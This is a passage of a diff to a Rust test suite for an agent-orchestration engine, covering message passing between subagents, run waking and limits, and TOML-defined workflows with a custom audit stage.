         &a,
         json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "remember", "note": "Use sqlx.", "stages": ["implement"]}], "research": [], "forget": ["N1"], "reason": "r"}),
     );
     let st = h.state();
-    assert!(st.user_notes[0].forgotten, "the note stays in the log");
-    assert_eq!(st.user_notes[1].id, "N2");
+    assert!(
+        st.ext.os().user_notes[0].forgotten,
+        "the note stays in the log"
+    );
+    assert_eq!(st.ext.os().user_notes[1].id, "N2");
     h.decide(
         JudgeKind::Stakes,
         None,
@@ -3828,7 +4252,7 @@ fn j1_an_answer_split_into_parts_keeps_every_note() {
     );
     let st = h.state();
     assert_eq!(
-        st.notes_for(ostra_engine::judge::NoteStage::Tests),
+        st.notes_for(ostra_default_plugin::judge::NoteStage::Tests),
         vec!["Use a temp file."]
     );
     let rerun = h.spawn_step("spawn implementer phase 1 rescue");
@@ -4020,7 +4444,7 @@ fn rule_o4_the_init_runs_before_anything_else_in_the_new_project() {
     );
     let detect = h.spawn_step("spawn initializer init detect");
     assert_eq!(detect.project, "mcp");
-    let focus = &detect.inputs.init["User focus"];
+    let focus = &detect.inputs.ox().init["User focus"];
     assert!(
         focus.contains("Stack: rust") && focus.contains("- rmcp 3.5 over stdio"),
         "{focus}"
@@ -4106,10 +4530,10 @@ fn rule_o5_the_advisor_looks_at_a_failed_init_step_first() {
     );
     assert_eq!(mcp_steps(&h), vec!["spawn advisor advise mcp #1"]);
     let advice = h.spawn_step("spawn advisor");
-    assert_eq!(advice.inputs.init["Failed step"], "initializer detect");
-    assert!(advice.inputs.init["Problem"].contains("a stack"));
+    assert_eq!(advice.inputs.ox().init["Failed step"], "initializer detect");
+    assert!(advice.inputs.ox().init["Problem"].contains("a stack"));
     assert!(
-        advice.inputs.init["Step result"].contains("\"diagnostic\": \"no files\""),
+        advice.inputs.ox().init["Step result"].contains("\"diagnostic\": \"no files\""),
         "the advisor sees what the step returned"
     );
     h.run(
@@ -4118,7 +4542,7 @@ fn rule_o5_the_advisor_looks_at_a_failed_init_step_first() {
     );
     let again = h.spawn_step("spawn initializer init detect");
     assert_eq!(
-        again.inputs.init["Advisor guidance"],
+        again.inputs.ox().init["Advisor guidance"],
         "Plan one slice over the root and seed from the rust reference."
     );
 }
@@ -4161,7 +4585,7 @@ fn rule_o5_an_escalation_or_used_up_advice_asks_the_user() {
             text: None,
         },
     );
-    for round in 1..=ostra_engine::init::MAX_ADVICE {
+    for round in 1..=ostra_default_plugin::init::MAX_ADVICE {
         fail(&mut h);
         h.run(
             &format!("spawn advisor advise mcp #{round}"),
@@ -4221,34 +4645,47 @@ fn rule_o4_abandoning_a_created_project_init_does_not_fail_the_session() {
 }
 
 // ------------------------------------------------------------------------------------------
-// H1 to H9: subagent coordination (HANDOVER 10.8).
+// SM1 to SM9 and H5 to H7: messages between subagents and pair loops (HANDOVER 10.8).
 // ------------------------------------------------------------------------------------------
 
-use ostra_core::coord::{AskTarget, DeliveryKind};
+use ostra_core::coord::{DeliveryKind, MessageTarget};
 use ostra_core::ids::MessageId;
 
 impl H {
-    fn ask(&mut self, from: &ExecutionId, target: AskTarget, message: &str) -> MessageId {
+    fn send(
+        &mut self,
+        from: &ExecutionId,
+        to: MessageTarget,
+        message: &str,
+        wait: bool,
+    ) -> MessageId {
         let id = MessageId::new();
-        self.ev(SessionEvent::AgentAsked {
+        self.ev(SessionEvent::MessageSent {
             id: id.clone(),
             from: from.clone(),
-            target,
-            message: message.into(),
+            to,
+            text: message.into(),
+            wait,
         });
         id
     }
 
-    fn reply(&mut self, ask: &MessageId, from: &ExecutionId, message: &str) {
-        self.ev(SessionEvent::AgentReplied {
-            ask: ask.clone(),
-            from: from.clone(),
-            message: message.into(),
-        });
-    }
-
     fn wait(&mut self, id: &ExecutionId) {
         self.finish_with(id, ExecutionStatus::Waiting, None, None);
+    }
+
+    /// Hand a running run its queued messages at a turn boundary, as its executor does.
+    fn take(&mut self, id: &ExecutionId) -> String {
+        let d = self
+            .state()
+            .next_delivery(id)
+            .expect("messages are queued for the run");
+        self.ev(SessionEvent::MessagesDelivered {
+            to: id.clone(),
+            ids: d.ids.clone(),
+            notice: d.notice.clone(),
+        });
+        d.note
     }
 
     fn finish_with(
@@ -4272,29 +4709,22 @@ impl H {
     }
 
     /// Wake a native run in place the way the runner does: the delivery, then the resume.
-    fn wake(&mut self, prefix: &str) -> (ExecutionId, DeliveryKind, String) {
+    fn wake(&mut self, prefix: &str) -> (ExecutionId, String) {
         let req = self.spawn_step(prefix);
         let id = req
             .resumes
             .clone()
             .expect("the spawn wakes a waiting run in place");
-        let d = self
-            .state()
-            .next_delivery(&id)
-            .expect("a message waits for the run");
-        self.ev(SessionEvent::MessageDelivered {
-            ask: d.ask.clone(),
-            to: id.clone(),
-            kind: d.kind,
-        });
+        let note = self.take(&id);
         self.ev(SessionEvent::ExecutionResumed { id: id.clone() });
-        (id, d.kind, d.note)
+        (id, note)
     }
 
     fn start_on(&mut self, prefix: &str, executor: ExecutorKind) -> ExecutionId {
         let req = self.spawn_step(prefix);
         let id = ExecutionId::new();
         self.ev(SessionEvent::ExecutionStarted {
+            projects: Vec::new(),
             id: id.clone(),
             agent: req.agent,
             purpose: req.purpose.clone(),
@@ -4306,6 +4736,7 @@ impl H {
             spawn_block: String::new(),
             report_path: None,
             resumes: req.continues.clone(),
+            contract: None,
         });
         id
     }
@@ -4337,6 +4768,7 @@ fn h5_fact_check_loop_wakes_the_author_and_continues_the_checker() {
     assert!(
         revise
             .inputs
+            .ox()
             .findings
             .unwrap()
             .contains("R2 cites a missing file")
@@ -4478,24 +4910,29 @@ fn h6_a_conversation_stops_continuing_at_its_run_cap() {
     );
 }
 
+fn explore_helper() -> MessageTarget {
+    MessageTarget::Agent {
+        agent: AgentName::Explore,
+        project: "p".into(),
+        contract: Some(ostra_core::Contract::Research),
+    }
+}
+
 #[test]
-fn h2_k3_a_helper_answers_and_the_asker_wakes_in_place() {
+fn sm3_a_helper_result_wakes_the_sender_in_place() {
     let mut h = H::explored(&["p"], SessionOptions::default());
     let (spec, _) = h.start("spawn generate-spec spec#1");
-    let ask = h.ask(
+    let m = h.send(
         &spec,
-        AskTarget::Agent {
-            agent: AgentName::Explore,
-            project: "p".into(),
-        },
+        explore_helper(),
         "How does the refund service round amounts?",
+        true,
     );
     h.wait(&spec);
     let st = h.state();
     assert!(st.is_waiting(&spec));
-    let s = h.summaries();
     assert_eq!(
-        s,
+        h.summaries(),
         vec!["spawn explore explore#1"],
         "the stage holds while the author waits"
     );
@@ -4503,14 +4940,18 @@ fn h2_k3_a_helper_answers_and_the_asker_wakes_in_place() {
     assert!(helper.inputs.task.unwrap().contains("round amounts"));
     let (e, _) = h.start("spawn explore explore#1");
     h.finish(&e, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
-    let (id, kind, note) = h.wake("spawn generate-spec");
+    let (id, note) = h.wake("spawn generate-spec");
     assert_eq!(id, spec);
-    assert_eq!(kind, DeliveryKind::Answer);
     assert!(note.contains("ostra-research-1.md"), "{note}");
+    assert!(note.contains("The result of subagent"), "{note}");
     let st = h.state();
-    assert!(st.asks[&ask].answer_delivered);
+    assert!(st.messages.iter().all(|x| x.delivered_to.is_some()), "{m}");
     assert!(!st.is_waiting(&spec));
-    assert_eq!(st.spec.runs.len(), 1, "a woken run is the same run");
+    assert_eq!(
+        st.ext.os().spec.runs.len(),
+        1,
+        "a woken run is the same run"
+    );
     assert!(
         h.summaries().is_empty(),
         "the author runs again: {:?}",
@@ -4518,94 +4959,100 @@ fn h2_k3_a_helper_answers_and_the_asker_wakes_in_place() {
     );
     h.finish(&spec, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
     assert_eq!(h.summaries(), vec!["spawn fact-check fact-check-spec#1"]);
+    // Rule H5: a run that was woken in place is still the conversation the next round continues.
+    h.run(
+        "spawn fact-check fact-check-spec#1",
+        fact("FAIL", "spec", &["R1"]),
+    );
+    assert_eq!(
+        h.spawn_step("spawn generate-spec spec#2").continues,
+        Some(spec)
+    );
 }
 
 #[test]
-fn h3_a_helper_asks_its_asker_back_and_both_wake_in_turn() {
+fn sm6_a_helper_messages_its_sender_back_and_both_wake_in_turn() {
     let mut h = H::explored(&["p"], SessionOptions::default());
     let (spec, _) = h.start("spawn generate-spec spec#1");
-    h.ask(
-        &spec,
-        AskTarget::Agent {
-            agent: AgentName::Explore,
-            project: "p".into(),
-        },
-        "Research the refund API.",
-    );
+    h.send(&spec, explore_helper(), "Research the refund API.", true);
     h.wait(&spec);
     let (e, _) = h.start("spawn explore explore#1");
-    let q = h.ask(
+    h.send(
         &e,
-        AskTarget::Subagent { id: spec.clone() },
+        MessageTarget::Subagent { id: spec.clone() },
         "Card refunds or all refunds?",
+        true,
     );
     h.wait(&e);
-    let (id, kind, note) = h.wake("spawn generate-spec");
-    assert_eq!((id.clone(), kind), (spec.clone(), DeliveryKind::Question));
-    assert!(note.contains("Card refunds or all refunds?") && note.contains("SubagentReply"));
+    let (id, note) = h.wake("spawn generate-spec");
+    assert_eq!(id, spec);
+    assert!(note.contains("Card refunds or all refunds?"), "{note}");
+    assert!(note.contains("It waits for your reply"), "{note}");
     let st = h.state();
-    assert_eq!(st.owed_by(&spec).map(|a| a.id.clone()), Some(q.clone()));
+    assert_eq!(st.owed_by(&spec), vec![e.clone()]);
+    let blocked = st.submit_blocked(&spec).unwrap();
     assert!(
-        st.ask_event(&spec, &json!({"message": "m", "agent": "explore"}))
-            .is_err(),
-        "H4: reply first"
+        blocked.contains("SendMessage") && blocked.contains(e.as_str()),
+        "{blocked}"
     );
-    h.reply(&q, &spec, "Card refunds only.");
+    h.send(
+        &spec,
+        MessageTarget::Subagent { id: e.clone() },
+        "Card refunds only.",
+        true,
+    );
+    assert!(h.state().submit_blocked(&spec).is_none(), "replied");
     h.wait(&spec);
-    let (id, kind, note) = h.wake("spawn explore explore#1");
-    assert_eq!((id, kind), (e.clone(), DeliveryKind::Answer));
+    let (id, note) = h.wake("spawn explore explore#1");
+    assert_eq!(id, e);
     assert!(note.contains("Card refunds only."));
     assert!(
         h.state().is_waiting(&spec),
         "the author still waits for the research"
     );
     h.finish(&e, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
-    assert_eq!(h.wake("spawn generate-spec").1, DeliveryKind::Answer);
+    let (id, note) = h.wake("spawn generate-spec");
+    assert_eq!(id, spec);
+    assert!(note.contains("ostra-research-1.md"), "{note}");
 }
 
 #[test]
-fn h3_a_subagent_that_ended_answers_in_a_consult_run() {
+fn sm4_a_message_continues_an_ended_subagent_with_its_tools() {
     let (mut h, author) = spec_written();
     let (checker, _) = h.start("spawn fact-check fact-check-spec#1");
-    let q = h.ask(
+    h.send(
         &checker,
-        AskTarget::Subagent { id: author.clone() },
-        "Where does R2 come from?",
+        MessageTarget::Subagent { id: author.clone() },
+        "R2 cites no source. Fix the spec and tell me when it is done.",
+        true,
     );
     h.wait(&checker);
     assert_eq!(
         h.summaries(),
-        vec!["spawn generate-spec consult (continues)"]
+        vec!["spawn generate-spec messages (continues)"]
     );
-    let consult = h.spawn_step("spawn generate-spec consult");
-    assert_eq!(consult.continues, Some(author.clone()));
-    assert_eq!(consult.stage, StageKind::Spec);
-    let (c, _) = h.start("spawn generate-spec consult");
+    let cont = h.spawn_step("spawn generate-spec messages");
+    assert_eq!(cont.continues, Some(author.clone()));
+    assert_eq!(cont.stage, StageKind::Spec);
+    let (c, _) = h.start("spawn generate-spec messages");
+    let note = h.take(&c);
+    assert!(note.contains("R2 cites no source"), "{note}");
     let st = h.state();
     assert_eq!(st.subagent_of(&c), author);
-    assert!(
-        st.ask_event(
-            &c,
-            &json!({"message": "m", "subagent_id": checker.as_str()})
-        )
-        .is_err(),
-        "H4: a consult run does not ask"
-    );
-    let (event, end) = st
-        .reply_event(&c, &json!({"message": "From the research doc."}))
-        .unwrap();
-    assert_eq!(end, ostra_core::coord::RunEnd::Finish);
-    h.ev(event);
-    h.finish(
+    assert!(st.submit_blocked(&c).is_some(), "the checker waits for it");
+    h.send(
         &c,
-        ExecutionStatus::Ok,
-        Some(json!({"coordination": "SubagentReply"})),
+        MessageTarget::Subagent {
+            id: checker.clone(),
+        },
+        "Fixed: R2 now cites the research document.",
+        false,
     );
-    let (id, kind, note) = h.wake("spawn fact-check");
-    assert_eq!((id, kind), (checker.clone(), DeliveryKind::Answer));
-    assert!(note.contains("From the research doc."));
-    assert!(h.state().asks[&q].answer_delivered);
-    // The next round of the author continues from the consult run, its latest.
+    h.finish(&c, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
+    let (id, note) = h.wake("spawn fact-check");
+    assert_eq!(id, checker);
+    assert!(note.contains("Fixed: R2"));
+    // The next round of the author continues from the message run, its latest.
     h.finish(
         &checker,
         ExecutionStatus::Ok,
@@ -4618,129 +5065,235 @@ fn h3_a_subagent_that_ended_answers_in_a_consult_run() {
 }
 
 #[test]
-fn h3_a_failed_subagent_answers_with_its_failure() {
-    let mut h = H::explored(&["p"], SessionOptions::default());
-    let (author, _) = h.start("spawn generate-spec spec#1");
-    h.finish(&author, ExecutionStatus::Error, None);
-    let (spec2, _) = h.start("spawn generate-spec spec#2");
-    let ask = h.ask(&spec2, AskTarget::Subagent { id: author.clone() }, "Why?");
-    h.wait(&spec2);
-    let st = h.state();
-    assert!(
-        st.effective_answer(&st.asks[&ask])
-            .unwrap()
-            .contains("cannot answer")
-    );
-    let (id, kind, _) = h.wake("spawn generate-spec");
-    assert_eq!((id, kind), (spec2, DeliveryKind::Answer));
-}
-
-#[test]
-fn h3_a_question_to_a_busy_subagent_waits() {
+fn sm3_a_waiting_run_hears_when_its_partner_ends_without_replying() {
     let mut h = H::new(&["p", "q"], SessionOptions::default());
     h.classify("RESEARCH", &["p", "q"]);
     let (a, _) = h.start("spawn explore explore#0");
     let (b, _) = h.start("spawn explore explore#1");
-    h.ask(
+    h.send(
         &a,
-        AskTarget::Subagent { id: b.clone() },
+        MessageTarget::Subagent { id: b.clone() },
         "What did you find in q?",
+        true,
     );
     h.wait(&a);
     assert!(
         h.summaries().is_empty(),
-        "b is running: {:?}",
+        "b is running, so the message waits for its turn boundary: {:?}",
         h.summaries()
     );
+    assert!(h.state().next_delivery(&b).is_some());
+    h.take(&b);
     h.finish(&b, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
-    assert_eq!(h.summaries(), vec!["spawn explore consult (continues)"]);
+    let (id, note) = h.wake("spawn explore explore#0");
+    assert_eq!(id, a);
+    assert!(note.contains("without sending you a message"), "{note}");
 }
 
 #[test]
-fn h2_a_harness_run_waits_alive_and_gets_a_delivery() {
+fn sm4_a_message_to_a_subagent_that_ended_before_its_turn_continues_it() {
+    let mut h = H::new(&["p", "q"], SessionOptions::default());
+    h.classify("RESEARCH", &["p", "q"]);
+    let (a, _) = h.start("spawn explore explore#0");
+    let (b, _) = h.start("spawn explore explore#1");
+    h.send(
+        &a,
+        MessageTarget::Subagent { id: b.clone() },
+        "What did you find in q?",
+        true,
+    );
+    h.wait(&a);
+    h.finish(&b, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
+    assert_eq!(h.summaries(), vec!["spawn explore messages (continues)"]);
+}
+
+#[test]
+fn sm3_a_failed_subagent_takes_no_messages() {
+    let mut h = H::explored(&["p"], SessionOptions::default());
+    let (author, _) = h.start("spawn generate-spec spec#1");
+    h.finish(&author, ExecutionStatus::Error, None);
+    let (spec2, _) = h.start("spawn generate-spec spec#2");
+    let err = h
+        .state()
+        .send_event(
+            &spec2,
+            &json!({"message": "Why?", "to": author.as_str()}),
+            &[(AgentName::Explore, ostra_core::Contract::Research)],
+        )
+        .unwrap_err();
+    assert!(err.contains("cannot take messages"), "{err}");
+}
+
+#[test]
+fn sm3_a_harness_run_waits_alive_and_takes_its_messages_itself() {
     let mut h = H::explored(&["p"], SessionOptions::default());
     let spec = h.start_on(
         "spawn generate-spec spec#1",
         ExecutorKind::Harness(ostra_core::HarnessKind::Claude),
     );
-    h.ask(
-        &spec,
-        AskTarget::Agent {
-            agent: AgentName::Explore,
-            project: "p".into(),
-        },
-        "Research X.",
-    );
+    h.send(&spec, explore_helper(), "Research X.", true);
     assert!(h.state().is_waiting(&spec), "alive and waiting");
     let (e, _) = h.start("spawn explore explore#1");
     h.finish(&e, ExecutionStatus::Ok, Some(explore_submit(1, &[])));
-    assert_eq!(h.summaries(), vec!["deliver answer"]);
-    let d = h.state().next_delivery(&spec).unwrap();
-    h.ev(SessionEvent::MessageDelivered {
-        ask: d.ask,
-        to: spec.clone(),
-        kind: d.kind,
-    });
-    assert!(h.summaries().is_empty());
+    assert!(
+        h.summaries().is_empty(),
+        "the harness executor takes the message itself"
+    );
+    h.take(&spec);
     assert!(!h.state().is_waiting(&spec));
 }
 
 #[test]
-fn h4_asks_are_bounded() {
+fn sm3_a_run_waiting_for_any_message_hears_when_none_can_come() {
     let mut h = H::explored(&["p"], SessionOptions::default());
     let (spec, _) = h.start("spawn generate-spec spec#1");
+    h.ev(h.state().wait_event(&spec).unwrap());
+    h.wait(&spec);
+    let (id, note) = h.wake("spawn generate-spec");
+    assert_eq!(id, spec);
+    assert!(note.contains("no message can come"), "{note}");
+}
+
+#[test]
+fn sm5_messages_are_bounded() {
+    let mut h = H::explored(&["p"], SessionOptions::default());
+    let (spec, _) = h.start("spawn generate-spec spec#1");
+    let helpers = [(AgentName::Explore, ostra_core::Contract::Research)];
     let helper = |p: &str| json!({"message": "m", "agent": "explore", "project": p});
     let st = h.state();
     assert!(
-        st.ask_event(&spec, &json!({"message": "m", "agent": "implementer"}))
-            .is_err()
+        st.send_event(
+            &spec,
+            &json!({"message": "m", "agent": "implementer"}),
+            &helpers
+        )
+        .is_err()
     );
     assert!(
-        st.ask_event(&spec, &helper("nope")).is_err(),
+        st.send_event(&spec, &helper("nope"), &helpers).is_err(),
         "unknown project"
     );
     assert!(
-        st.ask_event(
+        st.send_event(
             &spec,
-            &json!({"message": "m", "subagent_id": spec.as_str()})
+            &json!({"message": "m", "to": spec.as_str()}),
+            &helpers
         )
         .is_err(),
         "not yourself"
     );
     assert!(
-        st.ask_event(&spec, &json!({"message": "m", "subagent_id": "x_none"}))
+        st.send_event(&spec, &json!({"message": "m", "to": "x_none"}), &helpers)
             .is_err()
     );
-    assert!(
-        st.reply_event(&spec, &json!({"message": "m"})).is_err(),
-        "nothing to reply to"
-    );
     for _ in 0..ostra_core::coord::MAX_HELPERS_PER_RUN {
-        let (e, _) = h.state().ask_event(&spec, &helper("p")).unwrap();
+        let (e, _) = h.state().send_event(&spec, &helper("p"), &helpers).unwrap();
         h.ev(e);
     }
     assert!(
-        h.state().ask_event(&spec, &helper("p")).is_err(),
+        h.state().send_event(&spec, &helper("p"), &helpers).is_err(),
         "helper cap"
     );
     let (e, _) = h.start("spawn explore explore#1");
-    let err = h.state().ask_event(&e, &helper("p")).unwrap_err();
+    let err = h
+        .state()
+        .send_event(&e, &helper("p"), &helpers)
+        .unwrap_err();
     assert!(err.contains("helper may not start helpers"), "{err}");
 }
 
 #[test]
-fn h9_a_waiting_subagent_holds_completion() {
+fn sm7_a_custom_helper_runs_and_returns_its_result() {
+    let mut h = H::explored(&["p"], SessionOptions::default());
+    let (spec, _) = h.start("spawn generate-spec spec#1");
+    let auditor: AgentName = "auth-auditor".parse().unwrap();
+    let (e, _) = h
+        .state()
+        .send_event(
+            &spec,
+            &json!({"message": "Audit the login flow.", "agent": "auth-auditor", "wait": true}),
+            &[
+                (AgentName::Explore, ostra_core::Contract::Research),
+                (auditor, ostra_core::Contract::Stage),
+            ],
+        )
+        .unwrap();
+    h.ev(e);
+    h.wait(&spec);
+    assert_eq!(h.summaries(), vec!["spawn auth-auditor helper"]);
+    let req = h.spawn_step("spawn auth-auditor helper");
+    assert_eq!(req.inputs.task.as_deref(), Some("Audit the login flow."));
+    let (a, _) = h.start("spawn auth-auditor helper");
+    h.finish(
+        &a,
+        ExecutionStatus::Ok,
+        Some(json!({"verdict": "fail", "summary": "Sessions never expire.", "findings": [{"description": "No expiry", "file": "src/auth.rs"}]})),
+    );
+    let (id, note) = h.wake("spawn generate-spec");
+    assert_eq!(id, spec);
+    assert!(
+        note.contains("Verdict: fail") && note.contains("src/auth.rs: No expiry"),
+        "{note}"
+    );
+}
+
+#[test]
+fn sm8_logs_from_before_messaging_still_fold() {
+    let mut h = H::explored(&["p"], SessionOptions::default());
+    let (author, _) = h.start("spawn generate-spec spec#1");
+    h.finish(&author, ExecutionStatus::Ok, Some(spec_submit(0, 0)));
+    let (checker, _) = h.start("spawn fact-check fact-check-spec#1");
+    let ask = MessageId::new();
+    h.ev(SessionEvent::AgentAsked {
+        id: ask.clone(),
+        from: checker.clone(),
+        target: MessageTarget::Subagent { id: author.clone() },
+        message: "Where does R2 come from?".into(),
+    });
+    h.wait(&checker);
+    assert!(h.state().is_waiting(&checker));
+    let c = ExecutionId::new();
+    h.ev(SessionEvent::ExecutionStarted {
+        projects: Vec::new(),
+        id: c.clone(),
+        agent: AgentName::GenerateSpec,
+        purpose: ExecPurpose::Consult {
+            subagent: author.clone(),
+            ask: ask.clone(),
+        },
+        stage: StageKind::Spec,
+        project: "p".into(),
+        executor: ExecutorKind::Native,
+        model: "m".into(),
+        params: Value::Null,
+        spawn_block: String::new(),
+        report_path: None,
+        resumes: Some(author.clone()),
+        contract: None,
+    });
+    h.ev(SessionEvent::AgentReplied {
+        ask: ask.clone(),
+        from: c.clone(),
+        message: "From the research doc.".into(),
+    });
+    h.finish(&c, ExecutionStatus::Ok, None);
+    h.ev(SessionEvent::MessageDelivered {
+        ask,
+        to: checker.clone(),
+        kind: DeliveryKind::Answer,
+    });
+    let st = h.state();
+    assert!(!st.is_waiting(&checker));
+    assert!(st.messages.iter().all(|m| m.delivered_to.is_some()));
+    assert!(!st.coordination_open());
+}
+
+#[test]
+fn sm9_a_waiting_subagent_holds_completion() {
     let mut h = H::new(&["p"], SessionOptions::default());
     h.classify("RESEARCH", &["p"]);
     let (a, _) = h.start("spawn explore explore#0");
-    h.ask(
-        &a,
-        AskTarget::Agent {
-            agent: AgentName::Explore,
-            project: "p".into(),
-        },
-        "More on X.",
-    );
+    h.send(&a, explore_helper(), "More on X.", true);
     h.wait(&a);
     assert!(h.state().coordination_open());
     let s = h.summaries();
@@ -4853,10 +5406,13 @@ fn u1_context_can_skip_running_and_queued_research() {
     );
     let st = h.state();
     assert!(
-        st.explore[1].abandoned,
+        st.ext.os().explore[1].abandoned,
         "the interrupted task does not re-run"
     );
-    assert!(st.explore[2].abandoned, "the queued task never starts");
+    assert!(
+        st.ext.os().explore[2].abandoned,
+        "the queued task never starts"
+    );
     assert_eq!(h.summaries(), vec!["judge track"]);
 }
 
@@ -4887,7 +5443,7 @@ fn u1_queued_context_skips_research_once_running_work_finishes() {
         json!({"route": "implementation_detail", "items": [{"id": "answer", "disposition": "discard"}], "research": [], "skip": [2], "reason": "r"}),
     );
     assert!(
-        h.state().explore[1].abandoned,
+        h.state().ext.os().explore[1].abandoned,
         "the held-back task never starts"
     );
     assert_eq!(h.summaries(), vec!["judge track"]);
@@ -4918,4 +5474,1666 @@ fn d2_one_sufficiency_round_adds_at_most_three_tasks() {
             "spawn explore explore#3"
         ]
     );
+}
+
+// ------------------------------------------------------------------------------------------
+// WF1 to WF7: workflows, the pipeline as a graph of built-in and custom stages (HANDOVER 10.9).
+// ------------------------------------------------------------------------------------------
+
+use ostra_core::submit::StageVerdict;
+use ostra_core::workflow::{WorkflowChoice, WorkflowDef, WorkflowFile, WorkflowSet};
+
+fn workflow(toml_text: &str) -> WorkflowDef {
+    let file: WorkflowFile = toml::from_str(toml_text).unwrap();
+    WorkflowSet {
+        files: [("w".to_string(), file)].into_iter().collect(),
+        ..ostra_default_plugin::workflow_set()
+    }
+    .resolve("w")
+    .unwrap()
+}
+
+impl H {
+    /// A new session that recorded `wf` as its workflow (Rule WF1).
+    fn with_workflow(projects: &[&str], wf: WorkflowDef) -> H {
+        let mut h = H::new(projects, SessionOptions::default());
+        if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+            h.events.first_mut().map(|e| &mut e.event)
+        {
+            *workflow = Some(WorkflowChoice::ByCategory);
+        }
+        h.classify("IMPLEMENT", projects);
+        h.ev(SessionEvent::WorkflowResolved { workflow: wf });
+        for (i, _) in projects.iter().enumerate() {
+            h.run(
+                &format!("spawn explore explore#{i}"),
+                explore_submit(i, &[]),
+            );
+        }
+        h
+    }
+
+    /// Through an approved plan, on a workflow that fixes the full track and stakes high.
+    fn planned_with(wf: WorkflowDef, phases: Value) -> H {
+        let mut h = H::with_workflow(&["p"], wf);
+        h.run("spawn generate-spec", spec_submit(0, 1));
+        h.run(
+            "spawn fact-check fact-check-spec",
+            fact("PASS", "spec", &[]),
+        );
+        let g = h.open_gate("spec_approval");
+        h.answer(
+            &g,
+            GateAnswer::Approval {
+                approved: true,
+                feedback: None,
+            },
+        );
+        h.decide(
+            JudgeKind::Stakes,
+            None,
+            json!({"stakes": "high", "reason": "r"}),
+        );
+        h.run("spawn plan", plan_submit(phases));
+        h.run(
+            "spawn fact-check fact-check-plan",
+            fact("PASS", "plan", &[]),
+        );
+        let g = h.open_gate("plan_approval");
+        h.answer(
+            &g,
+            GateAnswer::Approval {
+                approved: true,
+                feedback: None,
+            },
+        );
+        h
+    }
+
+    fn stage_review(&mut self, option: &str, text: Option<&str>) {
+        let g = self.open_gate("stage_review");
+        self.answer(
+            &g,
+            GateAnswer::Choice {
+                option: option.into(),
+                text: text.map(String::from),
+            },
+        );
+    }
+}
+
+fn verdict(v: StageVerdict, summary: &str) -> Value {
+    json!({"verdict": v, "summary": summary, "findings": [{"description": "Sessions never expire", "file": "src/auth.rs"}]})
+}
+
+const AUDIT: &str = r#"
+extends = "implement"
+track = "full"
+remove = ["track", "feedback"]
+
+[[stage]]
+id = "audit"
+agent = "security-auditor"
+after = ["build"]
+before = ["closing"]
+instructions = "Check every changed file for secrets."
+on_fail = "retry"
+max_rounds = 2
+"#;
+
+#[test]
+fn wf1_a_new_session_records_its_workflow_once_classified() {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::ByCategory);
+    }
+    assert_eq!(h.summaries(), vec!["judge classify"]);
+    h.classify("IMPLEMENT", &["p"]);
+    assert_eq!(
+        h.summaries(),
+        vec!["resolve-workflow implement"],
+        "nothing runs before the workflow is recorded"
+    );
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: ostra_default_plugin::workflow(Category::Implement),
+    });
+    assert_eq!(h.summaries(), vec!["spawn explore explore#0"]);
+}
+
+#[test]
+fn wf1_a_named_workflow_resolves_first_and_sets_the_category() {
+    let mut h = H::new(&["p"], SessionOptions::default());
+    if let Some(SessionEvent::SessionCreated { workflow, .. }) =
+        h.events.first_mut().map(|e| &mut e.event)
+    {
+        *workflow = Some(WorkflowChoice::Named { name: "w".into() });
+    }
+    assert_eq!(h.summaries(), vec!["resolve-workflow w"]);
+    h.ev(SessionEvent::WorkflowResolved {
+        workflow: workflow("extends = \"research\""),
+    });
+    assert_eq!(h.summaries(), vec!["judge classify"]);
+    h.classify("IMPLEMENT", &["p"]);
+    assert_eq!(h.state().category, Some(Category::Research));
+}
+
+#[test]
+fn wf3_a_fixed_track_skips_the_track_judge() {
+    let h = H::with_workflow(&["p"], workflow(AUDIT));
+    assert_eq!(h.state().ext.os().track, Some(Track::Full));
+    assert_eq!(h.summaries(), vec!["spawn generate-spec spec#1"]);
+}
+
+#[test]
+fn wf4_a_custom_stage_runs_after_its_stages_and_holds_the_next() {
+    let mut h = H::planned_with(workflow(AUDIT), one_phase());
+    h.pass_phase(1);
+    assert_eq!(
+        h.summaries(),
+        vec!["spawn security-auditor stage audit#1"],
+        "feedback was removed, so the audit follows the build, and closing waits for it"
+    );
+    let req = h.spawn_step("spawn security-auditor stage audit#1");
+    assert_eq!(req.stage, StageKind::Custom);
+    assert_eq!(req.inputs.stage_id.as_deref(), Some("audit"));
+    assert_eq!(
+        req.inputs.instructions.as_deref(),
+        Some("Check every changed file for secrets.")
+    );
+    assert!(req.inputs.spec_file.is_some() && req.inputs.target.is_some());
+    h.run(
+        "spawn security-auditor stage audit#1",
+        verdict(StageVerdict::Pass, "No secrets."),
+    );
+    assert_eq!(h.summaries(), vec!["command format p"]);
+}
+
+#[test]
+fn wf5_a_failing_stage_retries_in_its_conversation_then_asks() {
+    let mut h = H::planned_with(workflow(AUDIT), one_phase());
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        verdict(StageVerdict::Fail, "A token is logged."),
+    );
+    let retry = h.spawn_step("spawn security-auditor stage audit#2");
+    assert!(
+        retry.continues.is_some(),
+        "WF5: the next round continues the agent"
+    );
+    assert!(
+        retry
+            .inputs
+            .prior_findings
+            .as_deref()
+            .unwrap()
+            .contains("src/auth.rs: Sessions never expire")
+    );
+    h.run(
+        "spawn security-auditor stage audit#2",
+        verdict(StageVerdict::Fail, "Still logged."),
+    );
+    assert_eq!(
+        h.summaries(),
+        vec!["gate stage_review"],
+        "max_rounds reached"
+    );
+    h.stage_review("continue", None);
+    assert_eq!(h.summaries(), vec!["command format p"]);
+}
+
+#[test]
+fn wf5_a_stage_that_needs_the_user_runs_again_with_the_answer() {
+    let mut h = H::planned_with(workflow(AUDIT), one_phase());
+    h.pass_phase(1);
+    h.run(
+        "spawn security-auditor stage audit#1",
+        json!({"verdict": "needs_user", "summary": "s", "question": "Is the debug log shipped?", "options": ["no", "yes"]}),
+    );
+    let g = h.open_gate("stage_review");
+    let err = h.state().gates[&g].payload.clone();
+    assert!(
